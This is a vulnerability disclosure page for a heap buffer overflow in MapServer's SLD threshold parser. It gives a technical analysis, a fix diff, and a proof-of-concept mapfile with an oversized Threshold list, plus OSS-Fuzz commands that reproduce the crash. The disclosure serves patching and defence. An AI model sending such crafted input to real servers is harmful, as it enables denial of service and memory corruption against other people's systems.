<!-- source: https://red.anthropic.com/2026/cvd/findings/ANT-2026-9SZMPW41 -->

# ANT-2026-9SZMPW41 · mapserver

## heap-buffer-overflow medium

[CVE-2026-33721](https://nvd.nist.gov/vuln/detail/CVE-2026-33721)

Claude medium
Security research firm medium
Maintainer -

Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Trail of Bits.

# ANT-2026-9SZMPW41: Heap buffer overflow in SLD categorize threshold parsing due to wrong counter variable in reallocation guard

While parsing Threshold entries in an SLD Categorize expression, the code grows a heap array to hold parsed thresholds, but the bounds check guarding the realloc uses the wrong counter variable. As a result the buffer is not enlarged when it should be, and subsequent threshold entries are written past the end of the allocation. An attacker who can supply an SLD document with many Threshold elements can trigger an out-of-bounds heap write.

**Project:** mapserver

The reallocation guard compares against a different counter than the one actually used to index/increment into the thresholds array, so the realloc branch is never (or not correctly) taken as thresholds accumulate. Writes then proceed past the allocated heap block. No ASAN output was provided in the report.

This finding was identified by static analysis and has not yet been dynamically reproduced. The Technical Details section above describes the code path; a trigger input is not included.

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-9SZMPW41.

---

**Reference:** ANT-2026-9SZMPW41

Triage and disclosure were performed by Trail of Bits. The writeup below is the document the firm sent to the maintainer.

:   medium

### Summary

A heap-buffer-overflow write in MapServer’s SLD (Styled Layer Descriptor) parser lets a remote, unauthenticated attacker crash the MapServer process by sending a crafted SLD with more than 100 Threshold elements inside a ColorMap/
Categorize structure (commonly reachable via WMS GetMap with SLD\_BODY).

### Details

MapServer’s SLD parser in msSLDParseRasterSymbolizer (src/mapogcsld.cpp, around the Categorize parsing logic) allocates papszThresholds for 100 entries (nMaxThreshold = 100) and appends one char\* per element while incrementing nThresholds, but the growth check mistakenly tests nValues == nMaxThreshold (where nValues counts nodes) instead of nThresholds == nMaxThreshold; when an SLD ColorMap/Categorize contains more than 100 elements, the code keeps writing past the end of the heap-allocated pointer array (an out-of-bounds 8-byte pointer write per extra element), leading to an ASAN heap-buffer-overflow and typically a remote crash/denial-of-service when attacker-controlled SLD is parsed (for example via WMS GetMap with SLD\_BODY, depending on deployment configuration).

### PoC

```
MAP
NAME "x"
CONFIG "MS_ERRORFILE" "/tmp/evilsld.xml"
OUTPUTFORMAT
NAME "<StyledLayerDescriptor><NamedLayer><Name>x</Name><UserStyle><FeatureTypeStyle><Rule><RasterSymbolizer><ColorMap><Categorize><Value>aaaaaaaaaaaa</Value><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>"
DRIVER "AGG/PNG"
IMAGEMODE RGB
TRANSPARENT ON
END
OUTPUTFORMAT
NAME "</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold><Threshold>1</Threshold></Categorize></ColorMap></RasterSymbolizer></Rule></FeatureTypeStyle></UserStyle></NamedLayer></StyledLayerDescriptor>"
DRIVER "AGG/PNG"
IMAGEMODE RGB
TRANSPARENT ON
END
CONFIG "MS_ERRORFILE" "stderr"
LAYER
NAME "test"
TYPE POINT
STYLEITEM "sld:///tmp/evilsld.xml"
END
END
```

Reproduce with

```
  export OSS_FUZZ_DIR="$HOME/src/oss-fuzz"
  git clone https://github.com/google/oss-fuzz.git "$OSS_FUZZ_DIR"
  cd "$OSS_FUZZ_DIR"
  python3 infra/helper.py build_fuzzers --sanitizer address mapserver
  python3 infra/helper.py reproduce mapserver mapfuzzer poc.bin
```

### Fix (idea)

```
  --- a/src/mapogcsld.cpp
  +++ b/src/mapogcsld.cpp
  @@ -2894,7 +2894,7 @@
           } else if (strcasecmp(psNode->pszValue, "Threshold") == 0) {
             papszThresholds[nThresholds] = psNode->psChild->pszValue;
             nThresholds++;
  -          if (nValues == nMaxThreshold) {
  +          if (nThresholds == nMaxThreshold) {
               nMaxThreshold += 100;
               papszThresholds = (char **)msSmallRealloc(
                   papszThresholds, sizeof(char *) * nMaxThreshold);
```

### Impact

Memory corruption (heap out-of-bounds write in a pointer array). Deployments that parse attacker-controlled SLD (commonly WMS users if SLD\_BODY is accepted/enabled).

### Background

Anthropic is conducting research into the use of large language models for automated vulnerability discovery in open source software. As part of that work, Anthropic used Claude to scan a set of widely used open source projects for security issues. Anthropic then engaged Trail of Bits to independently triage, manually validate, and develop patches for the findings. This issue has been reviewed and confirmed by human security researchers at Trail of Bits.

1. 2026-03-29
2. 2026-05-07
3. 2026-05-07
4. 2026-05-07
5. 2026-05-20

5623c6557ab0c7f772e18cc200aa77f720d757b39fdf25608bd142d507d38e19a70d8b584699cf63f0c46952a935a92275ba856109d79d2505f0cbc059aab77f

Committed 2026-05-07 00:01 PT

Revealed 2026-05-20 00:40 PT

[Verify (download preimage.json)](data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-9SZMPW41%22%2C%22bug_class%22%3A%22Heap%20Buffer%20Overflow%22%2C%22claude_severity%22%3A%22medium%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-03-29T20%3A43%3A18%2B00%3A00%22%2C%22description%22%3A%22While%20parsing%20Threshold%20entries%20in%20an%20SLD%20Categorize%20expression%2C%20the%20code%20grows%20a%20heap%20array%20to%20hold%20parsed%20thresholds%2C%20but%20the%20bounds%20check%20guarding%20the%20realloc%20uses%20the%20wrong%20counter%20variable.%20As%20a%20result%20the%20buffer%20is%20not%20enlarged%20when%20it%20should%20be%2C%20and%20subsequent%20threshold%20entries%20are%20written%20past%20the%20end%20of%20the%20allocation.%20An%20attacker%20who%20can%20supply%20an%20SLD%20document%20with%20many%20Threshold%20elements%20can%20trigger%20an%20out-of-bounds%20heap%20write.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3Anull%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22MapServer%22%2C%22reproduction%22%3Anull%2C%22technical_details%22%3A%22The%20reallocation%20guard%20compares%20against%20a%20different%20counter%20than%20the%20one%20actually%20used%20to%20index/increment%20into%20the%20thresholds%20array%2C%20so%20the%20realloc%20branch%20is%20never%20%28or%20not%20correctly%29%20taken%20as%20thresholds%20accumulate.%20Writes%20then%20proceed%20past%20the%20allocated%20heap%20block.%20No%20ASAN%20output%20was%20provided%20in%20the%20report.%22%2C%22title%22%3A%22Heap%20buffer%20overflow%20in%20SLD%20categorize%20threshold%20parsing%20due%20to%20wrong%20counter%20variable%20in%20reallocation%20guard%22%2C%22vendor_severity%22%3A%22medium%22%7D)

```
  "ant_id": "ANT-2026-9SZMPW41",
  "bug_class": "Heap Buffer Overflow",
  "claude_severity": "medium",
  "created_at": "2026-03-29T20:43:18+00:00",
  "description": "While parsing Threshold entries in an SLD Categorize expression, the code grows a heap array to hold parsed thresholds, but the bounds check guarding the realloc uses the wrong counter variable. As a result the buffer is not enlarged when it should be, and subsequent threshold entries are written past the end of the allocation. An attacker who can supply an SLD document with many Threshold elements can trigger an out-of-bounds heap write.",
  "project": "MapServer",
  "technical_details": "The reallocation guard compares against a different counter than the one actually used to index/increment into the thresholds array, so the realloc branch is never (or not correctly) taken as thresholds accumulate. Writes then proceed past the allocated heap block. No ASAN output was provided in the report.",
  "title": "Heap buffer overflow in SLD categorize threshold parsing due to wrong counter variable in reallocation guard",
  "vendor_severity": "medium"
```
